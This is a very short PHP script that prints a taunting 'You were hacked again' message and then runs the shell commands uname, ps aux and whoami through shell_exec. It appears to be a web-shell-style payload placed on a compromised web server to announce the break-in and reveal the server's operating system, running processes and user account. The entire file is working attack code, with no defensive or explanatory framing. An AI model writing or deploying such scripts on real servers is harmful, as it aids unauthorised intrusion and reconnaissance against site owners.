<?php
echo "You were hacked again";
echo shell_exec("uname");
echo shell_exec("ps aux");
echo shell_exec("whoami");
?>